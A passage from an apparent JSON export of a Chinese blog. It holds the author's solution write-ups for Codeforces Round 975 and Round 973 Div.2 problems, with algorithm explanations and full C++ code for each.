x;cin>>x;\n\t\tcout<<mp[x]<<\" \";\n\t}\n\tcout<<endl;\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2019C\n\n主观难度：普及/提高-\n\n标签：贪心\n\n我们设 $x$ 为分的堆数，$y$ 为每个堆中牌的数量，$xy$ 即为包含的总牌数。再设初始时牌数为 $sum$，某个类型最大的牌数为 $maxx$（$maxx=max(a_1,a_2,...,a_n)$）。首先有个性质，假如我们不受 $k$ 的限制，可以任意加牌，我们在确定了 $x$ 和 $y$ 之后，发现还差点牌（即 $xy>sum$），那么是一定可以补上，且仍保持每堆中牌类型各不相同。\n\n显然，$sum\\le xy\\le sum+k$。$maxx\\le x$（因为同一个堆中不能有相同的牌，所以相同类型的牌一定是要放到不同的堆）。\n\n题目即要求我们求出 $y$ 的最大值。其实检查一个答案是否合法的时间复杂度并不高，所以我们考虑从大到小枚举 $y$。对于给定的 $y$，$x$ 是有范围的，为 $\\left \\lceil \\frac{sum}{y} \\right \\rceil \\le x \\le \\left \\lfloor \\frac{sum+k}{y} \\right \\rfloor$，再加上 $maxx\\le x$，两个范围叠加上去，如果 $x$ 有解，那么当前枚举的 $y$ 是合法的。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\ninline void subtask(){\n\tint n,k;cin>>n>>k;\n\tint maxx=-inf;\n\tint sum=0;\n\tfor(int i=1;i<=n;i++){\n\t\tint x;cin>>x;\n\t\tmaxx=max(maxx,x);\n\t\tsum+=x;\n\t}\n\tfor(int i=n;i>=1;i--){\n\t\tint fl=ceil(1.0*sum/i);\n\t\tint fr=floor(1.0*(sum+k)/i);\n\t\tif(fl>fr) continue;\n\t\tif(maxx<=fr){\n\t\t\tcout<<i<<endl;\n\t\t\tbreak;\n\t\t}\n\t}\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2019D\n\n主观难度：普及+/提高\n\n标签：前缀和、二分、差分\n\n比 E 难，赛时感觉做不出来就摆烂了，后面又自己想出来了。\n\n首先有一点，如果点 $i$ 的时间限制为 $t_i$，那么与 $i$ 距离大于 $t_i$ 的点都不会是有获胜策略的点。通过这一点我们就可以先排除一部分点。\n\n然后我们考虑只判断一个点该怎么做。我们贪心地考虑，肯定先左右寻找 $t$ 最小的点，然后一直沿着这个点的方向占领，直到占领了这个点，然后再寻找下一个最小的点，沿着对应的方向占领，以此类推。因为我们很自然地想去先把当前最棘手的点先处理掉，不那么棘手的点之后再处理。\n\n然后我们就又得到一个结论，对于两个点 $x$ 和 $y$，如果 $x$ 和 $y$ 之间点的数量（包括$x$ 和 $y$）大于 $max(t_x,t_y)$，那么这两个点之间的所有的点都不会是有必胜策略的点。可以按照上述的贪心策略证明。这中间的点，肯定会先去占领 $x$ 和 $y$ 中 $t$ 最小的那个，占领完毕后再去占领另一个，此时中间所有的点都被占领了，但是耗费时间却大于另一个点的 $t$ 值，无法占领另一个点。\n\n我们考虑枚举 $x$ 和 $y$。考虑枚举两者之间 $t$ 值最大的那个，记为 $x$，然后分别在 $[1,x-t_x]$ 和 $[x+t_x,n]$ 中寻找距离 $x$ 最远的且小于等于 $t_x$ 的点 $y$，然后 $x$ 和 $y$ 之间所有的点都标记为无必胜策略的点。其中，寻找 $y$ 可以通过搞前缀和后缀最小值+二分解决。标记无必胜策略点可以通过差分来解决。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\n#define _ 200005\ntypedef pair<int,int> pii;\nint tag[_],in[_],pre[_],suf[_];\ninline void push(int l,int r){tag[l]++,tag[r+1]--;}\ninline void subtask(){\n    int n;cin>>n;\n    for(int i=1;i<=n;i++) cin>>in[i];\n    for(int i=1;i<=n;i++){\n        int r=i+in[i],l=i-in[i];\n        if(r<=n) push(r,n);\n        if(l>=1) push(1,l);\n    }\n    pre[1]=in[1],suf[n]=in[n];\n    for(int i=2;i<=n;i++) pre[i]=min(pre[i-1],in[i]);\n    for(int i=n-1;i>=1;i--) suf[i]=min(suf[i+1],in[i]);\n    for(int i=1;i<=n;i++){\n        int now=in[i];\n        int R=i+in[i],L=i-in[i];\n        if(R<=n){\n            //deal right\n            int l=R,r=n,ans=-1;\n            while(l<=r){\n                int mid=(l+r)>>1;\n                if(suf[mid]<=now){\n                    ans=mid;\n                    l=mid+1;\n                }else r=mid-1;\n            }\n            if(ans!=-1) push(i,ans);\n        }\n        if(L>=1){\n            //deal left\n            int l=1,r=L,ans=-1;\n            while(l<=r){\n                int mid=(l+r)>>1;\n                if(pre[mid]<=now){\n                    ans=mid;\n                    r=mid-1;\n                }else l=mid+1;\n            }\n            if(ans!=-1) push(ans,i);\n        }\n    }\n    int sum=0,ans=0;\n    for(int i=1;i<=n;i++){\n        sum+=tag[i];\n        if(!sum) ans++;\n    }\n    cout<<ans<<endl;\n    for(int i=1;i<=n+1;i++) tag[i]=0;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    for(int i=1;i<=t;i++){\n        subtask();\n    }\n    return 0;\n}\n```\n\n注意的是，差分这里有这样的一句 `tag[r+1]--`，如果 $r$ 取 $n$，那么就涉及到了 $tag[n+1]$ 。如果最后清空的时候只清空到 $tag[n]$ 的话就寄啦！\n\n## CF2019E\n\n主观难度：普及/提高-\n\n标签：图论、bfs、dfs\n\n赛时看这道题过的比D还多，于是直接跳过D来做E。一开始有点被题号吓到了，不过思考之后发现还是不难的。\n\n到根的距离即为深度。我们从点 $1$ 开始一种类似 $bfs$ 的处理方式。先把点 $1$ 的子节点都取出来，放入 $sta$ 数组中。这些点加上点 $1$ 就是如果我们让所有的点到根距离都为 $1$ 的话，需要保留的点。$sta$ 数组表示的是位于当前深度的点。考虑增加深度，我们让 $sta$ 数组中的点都尝试往下再遍历新的点。如果能的话就再把新的点也加入 $stb$ 数组中，不能的话，说明这个点要被删掉，给它打个标记。如果一个点的所有子点都被标记为删除，那么这个点也要被标记删除。然后在把 $stb$ 数组替换 $sta$ 数组，重复上述过程。一个点最多被添加一次，删除一次，所以复杂度是能控制住的。这个过程中维护当前留下来的点。\n\n```cpp\n#include<bits/stdc++.h>\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\n#define _ 500005\nusing namespace std;\nconst int inf=0x3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nstruct Edge{int next,to;} edge[_<<1];\nint head[_],siz,f[_],tag[_],cnt[_];\ninline void add(int u,int v){edge[++siz].to=v,edge[siz].next=head[u],head[u]=siz;}\nvoid dfs1(int x,int fa){\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa) continue;\n\t\tf[to]=x;\n\t\tcnt[x]++;\n\t\tdfs1(to,x);\n\t}\n}\nint sta[_],stb[_],pa,pb,ans[_],now,dep;\nvoid del(int x){\n\tnow--;\n\ttag[f[x]]++;\n\tif(tag[f[x]]==cnt[f[x]]){\n\t\tdel(f[x]);\n\t}\n}\nvoid dfs2(int x){\n\tans[x]=now;\n\tpb=0;\n\tfor(int i=1;i<=pa;i++){\n\t\tif(!cnt[sta[i]]){\n\t\t\tdel(sta[i]);\n\t\t}else{\n\t\t\tfor(int j=head[sta[i]];j;j=edge[j].next){\n\t\t\t\tint to=edge[j].to;\n\t\t\t\tif(to==f[sta[i]]) continue;\n\t\t\t\tstb[++pb]=to;\n\t\t\t\tnow++;\n\t\t\t}\n\t\t}\n\t}\n\tpa=0;\n\tfor(int i=1;i<=pb;i++){\n\t\tsta[++pa]=stb[i];\n\t}\n\tif(pa==0) return dep=x,void();\n\telse dfs2(x+1);\n}\ninline void subtask(){\n\tint n;cin>>n;\n\tfor(int i=1;i<n;i++){\n\t\tint u,v;cin>>u>>v;\n\t\tadd(u,v);add(v,u);\n\t}\n\tdfs1(1,0);\n\tpa=0;\n\tfor(int i=head[1];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tsta[++pa]=to;\n\t}\n\tnow=1+pa;\n\tdfs2(1);\n\tint maxx=-inf;\n\tfor(int i=1;i<=dep;i++) maxx=max(maxx,ans[i]);\n\tcout<<n-maxx<<endl;\n\n\tsiz=0;\n\tfor(int i=1;i<=n;i++) head[i]=f[i]=cnt[i]=tag[i]=0;\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2019F\n\n主观难度：普及+/提高\n\n标签：并查集、贪心\n\n感觉最后要最大化的东西影响因素很多，不好处理，于是就摆烂了（划掉\n\n首先需要观察出一点：一定要把最大值选上（和A很像）。如果最大值两边都没有被选，显然选上最大值是更好的。如果一边的数被选了，显然取消选中，该选最大值是更好的。如果两边都选了，把这两个都取消选中，选上最大值，虽然数量上少了一，但是最大值比次大值至少大一，因此把亏的又给补上了。综上，一定要把最大值选上。\n\n影响最终式子的还有最小值。我们不妨直接枚举最小值吧。从大到小枚举最小值。因为我们枚举的是最小值，所以只有位于最大值和最小值之间的数字目前能被选中。随着这个枚举过程，我们能够选中的数字是越来越多的。\n\n但还有一个限制，选中的数字不能相邻。现在能被选中的数字都是可以随便选的，只会对选中的数量产生影响。于是我们考虑一个东西，给你一个序列，选择的数不能相邻，最多能选多少个数？显然是 $\\left \\lceil \\frac{len}{2} \\right \\rceil$ 的（ $len$ 为这个序列的长度）。随着最小值的枚举，能够选中的数字是越来越多，这些能够选中的位置就形成了若干个联通块，各个联通块内怎么选互不干扰。于是我们维护联通块大小（这里就用到并查集了）一个大小为 $len$ 的联通块对答案的贡献为 $\\left \\lceil \\frac{len}{2} \\right \\rceil$。\n\n不过这里又有点问题，上述的做法的前提是能够选中的数字随便选。你要随便选的话可能没选中最大值，而我们说你要选中最大值了才是最优的。如果一个联通块内能把最大值选上，那么其他联通块内就能随便选了。对于偶数长度的联通块，只要包含最大值，就是能够选上的。而对于奇数的联通块，我们上面得出联通块对答案的贡献为 $\\left \\lceil \\frac{len}{2} \\right \\rceil$ 的前提是奇数长度联通块都是把第奇数个元素选中。而最大值可不一定在第奇数个元素里面。我们考虑，如果所有的偶数长度的联通块中不包含最大值，奇数长度的联通块中，最大值都出现在第偶数个元素的位置，那么就必须有一个奇数长度的联通块需要牺牲一下，不把第奇数个元素选中，而把第偶数个元素选中，对答案的贡献由 $\\left \\lceil \\frac{len}{2} \\right \\rceil$ 变为 $\\left \\lfloor \\frac{len}{2} \\right \\rfloor$，减了一。但是这个联通块牺牲后，最大值就被选上了，其余联通块对答案贡献不变。\n\n为了处理这些，我们需要对每个联通块记录一下，其奇数位置是否有最大值出现，偶数位置是否有最大值出现。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 200005\nint in[_],fa[_],has[_][2],siz[_],tag,pick[_],cnt;\n// tag为当前有多少个联通块能在不降低对答案的贡献情况下把最大值选上\n// cnt为当前所有联通块的长度部分对答案的贡献\ninline int find(int x){while(x!=fa[x]) x=fa[x]=fa[fa[x]];return x;}\ninline bool provide(int x){\n    if(siz[x]%2==0) return max(has[x][0],has[x][1]);\n    else return has[x][1];\n}\ninline void uni(int l,int r){\n    int fax=find(l),fay=find(r);\n    if(provide(fax)) tag--;\n    if(provide(fay)) tag--;\n    cnt-=ceil(1.0*siz[fax]/2);\n    cnt-=ceil(1.0*siz[fay]/2);\n    if(siz[fax]%2) has[fax][0]=max(has[fax][0],has[fay][1]),has[fax][1]=max(has[fax][1],has[fay][0]);\n    else has[fax][0]=max(has[fax][0],has[fay][0]),has[fax][1]=max(has[fax][1],has[fay][1]);\n    siz[fax]=siz[fax]+siz[fay];\n    fa[fay]=fax;\n    if(provide(fax)) tag++;\n    cnt+=ceil(1.0*siz[fax]/2);\n}\npii pa[_];\ninline void subtask(){\n    tag=0;cnt=0;\n    int n;\n    cin>>n;for(int i=1;i<=n;i++) cin>>in[i];\n    if(flag){\n        for(int i=1;i<=n;i++) cout<<in[i]<<' ';\n        cout<<endl;\n    }\n    for(int i=1;i<=n;i++) fa[i]=i,siz[i]=1;\n    for(int i=1;i<=n;i++) pa[i]=pii(i,in[i]);\n    sort(pa+1,pa+n+1,[](pii a,pii b){return a.second>b.second;});\n    for(int i=1;i<=n;i++){\n        has[i][0]=0;\n        if(in[i]==pa[1].second) has[i][1]=1;\n        else has[i][1]=0;\n        pick[i]=0;\n    }\n    int ans=-inf;\n    for(int i=1;i<=n;i++){\n        int p=pa[i].first,v=pa[i].second;\n        //debug(p);\n        tag+=has[p][1];pick[p]=1;cnt++;\n        if(p>=2&&pick[p-1]) uni(p-1,p);\n        if(p<=n-1&&pick[p+1]) uni(p,p+1);\n        if(tag) ans=max(ans,pa[1].second+v+cnt);\n        else ans=max(ans,pa[1].second+v+cnt-1);\n    }\n    cout<<ans<<endl;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    for(int i=1;i<=t;i++) subtask();\n    return 0;\n}\n```\n\n","summary":"Codeforces Round 975 Div.2总结，A、B、C、D、E、F","key":["codeforces","cf","975","div2"],"tags":[],"path":["算法竞赛","做题、VP","Codeforces","Codeforces Round 975 Div.2.md"],"background":"https://www.caiwen.work/wp-content/uploads/2024/10/未命名4.jpg","recommend":false,"status":"published"},{"type":"Article","title":"Codeforces Round 973 Div.2","id":"cf973-2","createTime":"2024-10-01T11:48:00.000Z","updateTime":"2025-09-05T13:34:06.141Z","content":"\n还好是定级赛，不然肯定挂大分了...\n\n## CF2013A\n\n太简单了， 没啥好说的，直接就写出来了\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\ninline void subtask(){\n\tint n,x,y;cin>>n>>x>>y;\n\tif(x>=y){\n\t\tcout<<ceil(1.0*n/y)<<endl;\n\t}else{\n\t\tcout<<ceil(1.0*n/x)<<endl;\n\t}\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n然后就寄了....\n\n因为ceil返回值为double类型，结果太大的话，cout输出时会按科学计数法输出，和答案对不上。\n\n本来写的挺快，结果WA了，反复看了好久才发现这一点，再ac的时候已经有1w人通过了...或许预示着这次比赛会很坎坷...\n\n## CF2013B\n\n手玩几个样例，发现最后必然是最后一个数减去某个数。显然，减去的数越小越好。贪心地考虑，我们让倒数第二个数把前面所有的数字都减一遍，那么应该就能得到一个很小的数了，然后再让最后一个数减去他，得到的结果就是最大的。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\n#define _ 200005\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint in[_];\ninline void subtask(){\n\tint n;cin>>n;\n\tfor(int i=1;i<=n;i++) cin>>in[i];\n\tint now=in[n-1];\n\tint sum=0;\n\tfor(int i=1;i<=n-2;i++) sum+=in[i];\n\tcout<<in[n]-(now-sum)<<endl;\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2013C\n\n交互题，心脏骤停，从来没做过。赛时打算直接跳过这个题做D了，D wa了好几发，发现C通过的人越来越多，于是又赶紧过来看C。\n\n首先我的一个想法是类似于二分那种，先猜是否存在大于一半长度的全0或者全1，沿着这个思路想了好久没想出来。\n\n随后发现这个题根本不用这么复杂。首先询问是否全0，回答是就出答案了，反之就说明肯定存在1，我们把1放入答案序列中。\n\n随后我们就从这个1开始向两边延伸。往1后面加个1，组成11，询问11是否存在，如果存在再往后面加1...以此类推。如果不存在了就改为加0询问是否存在，如果答案序列结尾无论是加0还是加1都不存在了，说明右边已经到头了，改为从前面加1或者0然后询问，和上面大同小异。这样我们就能再在 $2n$ 次询问内把这个字符串破解出来。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\ndeque<int> d;\ninline bool ask_front(int x){\n\tcout<<\"? \";\n\tcout<<x;\n\tfor(auto it=d.begin();it!=d.end();++it) cout<<*it;\n\tcout<<endl;\n\tcout.flush();\n\tint ans;cin>>ans;\n\treturn ans;\n}\ninline bool ask_end(int x){\n\tcout<<\"? \";\n\tfor(auto it=d.begin();it!=d.end();++it) cout<<*it;\n\tcout<<x;\n\tcout<<endl;\n\tcout.flush();\n\tint ans;cin>>ans;\n\treturn ans;\n}\ninline void subtask(){\n\tint n;cin>>n;\n\tint now=0;\n\n\tcout<<\"? \";\n\tfor(int i=1;i<=n;i++) cout<<0;\n\tcout<<endl;\n\tcout.flush();\n\n\tint flag;cin>>flag;\n\tif(flag==1){\n\t\tcout<<\"! \";\n\t\tfor(int i=1;i<=n;i++) cout<<0;\n\t\tcout<<endl;\n\t\tcout.flush();\n\t\treturn;\n\t}\n\n\tnow++;\n\td.push_back(1);\n\n\tint dir=1;//1 for end\n\n\twhile(now!=n){\n\t\tif(dir==1){\n\t\t\tif(ask_end(1)) d.push_back(1),now++;\n\t\t\telse if(ask_end(0)) d.push_back(0),now++;\n\t\t\telse dir=0;\n\t\t}else{\n\t\t\tif(ask_front(1)) d.push_front(1),now++;\n\t\t\telse d.push_front(0),now++;\n\t\t}\n\t}\n\n\tcout<<\"! \";\n\tfor(auto it=d.begin();it!=d.end();++it) cout<<*it;\n\tcout<<endl;\n\tcout.flush();\n\n\twhile(!d.empty()) d.pop_back();\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2013D\n\n赛时wa了三发，最后发现做法假了....\n\n于是思考了很久，发现还是想复杂了\n\n首先我们有个性质：对于两个相邻的数 $a$ 和 $b$ ，如果后者比前者小，那么我们一定可以将两个数都调整为他们的平均数，且调整后，对最终答案的影响一定是不劣的。\n\n换句话说，后面那个数比前面那个数小，那么就能把这两个数都变成一个数。\n\n然后我们再考虑，如果经过我们的一顿调整，调整后的序列的极差最小了，这个最后的序列有什么特点？答案是一定是单调不降的。因为一旦后面的数小于前面的数，那么我们就可以来利用上述的性质使得答案更优，或者不变，至少是不劣的。\n\n我们知道了我们最终的目标，即把最后这个序列变成单调不降的。\n\n然后又有个性质，我们两个数不一定相邻，也可以。比如序列 `a b c`，我们先对 ab操作，得到 `a-1 b+1 c` 再对后面两个数操作，得到 `a-1 b+1-1 c+1` 即 `a-1 b c+1` ，你发现了吗，等价于直接选择ac进行操作。所以不相邻也是可以的。\n\n然后，我们不妨称将两个数变为一个数，即他们的平均数，这个操作叫做合并，将已经合并成一个数的这些数合称为一个块。然后，如果一个块（块里面所有的数都变成他们的平均数了），他后面紧跟着一个数，且这个数小于块的平均数，那么我们可以将这个块和这个数合并，变成一个新块，块中所有的数都等于他们的平均数。\n\n然后我们的做法就是，将这些数字从左向右，能合并就合并，最终合并完之后得到的序列一定是单调不降的，否则我们就还能再合并。\n\n注意，平均数可能是小数，小数不好处理，因此我们维护两个数，块内所有数的和，以及块中数字的数量。而且，如果平均数是小数的话，我们实际上无法将所有的数都调整为平均数，但能肯定的是，块中最大的数是平均数的上取整，最小的数是平均数的下取整。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\n#define _ 200005\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\npii arr[_];\nint n,in[_],cnt;\ninline void subtask(){\n\tcin>>n;\n\tfor(int i=1;i<=n;i++) cin>>in[i];\n\tarr[1]=pii(in[1],1);cnt=1;\n\tfor(int i=2;i<=n;i++){\n\t\tpii now=pii(in[i],1); // 块中只有一个数\n\t\twhile(arr[cnt].first*now.second>=arr[cnt].second*now.first&&cnt>=1){\n            // 不断尝试与前面的块合并。比较当前平均数和上一个块的平均数即可。注意我们实际上是把比较平均数那个式子给交叉相乘了一下，规避小数。\n\t\t\tnow.first+=arr[cnt].first;\n\t\t\tnow.second+=arr[cnt].second;\n\t\t\tcnt--;\n\t\t}\n\t\tcnt++;\n\t\tarr[cnt]=now;\n\t}\n\tdouble minn=1.0*arr[1].first/arr[1].second;// 第一个块必然是平均数最小块\n\tdouble maxx=1.0*arr[cnt].first/arr[cnt].second;\n\tcout<<(int)(ceil(maxx)-floor(minn))<<endl;\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2013E\n\n有点像上一场的 D，想到了大概会用到前缀gcd以log的速度收敛的性质。我还以为要用到什么科技，补题的时候想半天，以为要用到什么科技，没搞出来。结果没想到这么简单...\n\n首先，前缀gcd一定是单调不增的。\n\n其次，如果我们让前缀gcd不断减小，那么大概减小log次就到1了。\n\n然后，如果前缀gcd到1了，后面的数字怎么排无所谓了，反正得到的前缀gcd都是1。后面的部分我们甚至可以 $O(1)$ 统计答案。\n\n然我们就有个贪心：我们先把最小的数放在第一位，然后后面暴力枚举，枚举后面再放哪个数可以是当前的前缀gcd最小。看似是暴力的，但我们只需要log次枚举就能让前缀gcd归1，时间复杂度不会很大。\n\n有种特殊情况，就是如果所有数的gcd不为1的话，就意味着我们枚举到最后一个位置也无法让前缀gcd变为1。所以我们需要做个处理，先求出所有数的gcd，然后让每个数都除去这个gcd，然后最终答案再乘上这个gcd。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint in[100005];\ninline int gcd(int a,int b){\n\twhile(a%b){\n\t\tint t=a%b;\n\t\ta=b;\n\t\tb=t;\n\t}\n\treturn b;\n}\ninline void subtask(){\n\tint n;cin>>n;\n\tfor(int i=1;i<=n;i++) cin>>in[i];\n\tint g=in[1];\n\tfor(int i=1;i<=n;i++) g=gcd(g,in[i]);\n\tfor(int i=1;i<=n;i++) in[i]/=g;\n\tint minn=inf;\n\tfor(int i=1;i<=n;i++) minn=min(minn,in[i]);\n\tint ans=minn,now=minn,has=1;\n\tfor(int i=1;i<=n;i++){\n\t\tint t=now;\n\t\tfor(int j=1;j<=n;j++){\n\t\t\tt=min(t,gcd(now,in[j]));\n\t\t}\n\t\tans+=t;\n\t\tnow=t;\n\t\thas++;\n\t\tif(t==1){\n\t\t\tans+=n-has;\n\t\t\tbreak;\n\t\t}\n\t}\n\tcout<<ans*g<<endl;\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2013F1\n\n先换个视角，我们把从点 1 到点 u 路径上的点横向排列成一个链，大概长这样子：\n\n![](https://www.caiwen.work/wp-content/uploads/2024/10/image-20241001192634703.png)\n\n（图中三角部分为点的子树）\n\n然后，轮到一个人的回合时，这人总的来说只会有两个行为：要么跳入当前所在点的子树，要么继续沿着这个从 1 到 u 的链行走。\n\n我们假设，比如 Bob 在点 6 跳入了子树中，之后 Alice 就可以在点 1 到点 5 之间随便走了。\n\n![](https://www.caiwen.work/wp-content/uploads/2024/10/image-20241001193046693.png)\n\n假设当前回合是Bob的回合，在点6。Bob要不要选择跳入子树呢？那Bob就需要先判断，我跳入子树后，能走多远，假设跳入子树中最远能走 $x$ 个点。然后他还要计算，Alice最远还能走多远，假设为 $y$。如果 $x>y$ 那么 Bob 必胜。否则，Bob只能再小心翼翼地沿着链走。\n\n跳入一个子树后能走多远，可以通过dfs计算出来。对手能走的范围是一个区间，需要用st表维护。\n\n值得注意的一点，比如对于Alice，我们在st表中维护的是 $far[i]+i$，其中 $i$ 表示链上第 $i$ 个点，$far[i]$ 表示跳入点 $i$ 的子树后还能走多远。为什么？因为st表维护的这个是以 $1$ 为起点的距离，而Alice在后续过程中可能往前移动了。我们假设到了第 $j$ 个点。$far[i]+i-j$ 即为Alice在第 $j$ 个点，最后选择跳入点 $i$ 的子树中，能走多远。也就是后面我们再减去当前位置即可得到相对于当前位置的距离。Bob同理。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\n#define _ 200005\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint siz,head[_],p[_],fa[_],tag[_],far[_];\nint lg[_],sta[_][22],stb[_][22];\nstruct Edge{int next,to;} edge[_<<1];\ninline void add(int u,int v){edge[++siz].to=v,edge[siz].next=head[u],head[u]=siz;}\nvoid dfs1(int x,int f){\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==f) continue;\n\t\tfa[to]=x;\n\t\tdfs1(to,x);\n\t}\n}\nvoid dfs2(int x,int f){\n\tint mx=0;\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==f) continue;\n\t\tif(tag[to]) continue;\n\t\tdfs2(to,x);\n\t\tmx=max(mx,far[to]);\n\t}\n\tfar[x]=mx+1;\n\tif(f==0) far[x]--;\n}\ninline void subtask(){\n\tint n,t;\n\tcin>>n;\n\tfor(int i=1;i<n;i++){\n\t\tint u,v;cin>>u>>v;\n\t\tadd(u,v);add(v,u);\n\t}\n\tcin>>t;cin>>t;\n\tdfs1(1,0); //得到fa数组\n\tstack<int> st;\n\t// 下面这顿操作把从点 1 到点 u 所有的点取出来\n    int now=t;st.push(now);\n\twhile(now!=1){\n\t\tnow=fa[now];\n\t\tst.push(now);\n\t}\n\tint cnt=0;\n\twhile(!st.empty()){\n\t\tnow=st.top();st.pop();\n\t\ttag[now]=1;\n\t\tp[++cnt]=now;\n\t}\n    // 得到far数组\n\tfor(int i=1;i<=cnt;i++) dfs2(p[i],0);\n    // st表预处理\n\tfor(int i=1;i<=cnt;i++) sta[i][0]=far[p[i]]+i,stb[i][0]=far[p[i]]+cnt-i+1;\n\tfor(int i=1;i<=lg[cnt];i++){\n\t\tfor(int j=1;j<=cnt-(1<<i)+1;j++){\n\t\t\tsta[j][i]=max(sta[j][i-1],sta[j+(1<<(i-1))][i-1]);\n\t\t\tstb[j][i]=max(stb[j][i-1],stb[j+(1<<(i-1))][i-1]);\n\t\t}\n\t}\n\tnow=0;\n\tint l=1,r=cnt;//l 和 r 分别表示当前Alice和Bob在链上哪个点\n\twhile(l<r){\n\t\tif(now==0){\n\t\t\tint L=l+1,R=r;\n\t\t\tint k=lg[R-L+1];\n\t\t\tint bob=max(stb[L][k],stb[R-(1<<k)+1][k])-(cnt-r+1);\n\t\t\tif(far[p[l]]>bob){\n\t\t\t\tnow=1;\n\t\t\t\tbreak;\n\t\t\t}else l++;\n\t\t}else{\n\t\t\tint L=l,R=r-1;\n\t\t\tint k=lg[R-L+1];\n\t\t\tint ali=max(sta[L][k],sta[R-(1<<k)+1][k])-l;\n\t\t\tif(far[p[r]]>ali){\n\t\t\t\tnow=0;\n\t\t\t\tbreak;\n\t\t\t}else r--;\n\t\t}\n\t\tif(l==r) break;\n\t\tnow=1-now;\n\t}\n\tif(now) cout<<\"Alice\"<<endl;\n\telse cout<<\"Bob\"<<endl;\n\n\tsiz=0;\n\tfor(int i=1;i<=n;i++) head[i]=tag[i]=0;\n}\nsigned main(){\n\tfor(int i=2;i<=200000;i++) lg[i]=lg[i>>1]+1;\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2013F2\n\nmlgb，看半天也没看懂，摆了，有机会再补\n\n","summary":"Codeforces Round 973 Div.2总结，A、B、C、D、E、F1","key":["codeforces","cf","973","div2"],"tags":[{"value":"未补完","color":"error"}],"path":["算法竞赛","做题、VP","Codeforces","Codeforces Round 973 Div.2.md"],"background":"https://www.caiwen.work/wp-content/uploads/2024/10/未命名4-1.jpg","recommend":false,"status":"published"},{"type":"Article","title":"Codeforces Round 972 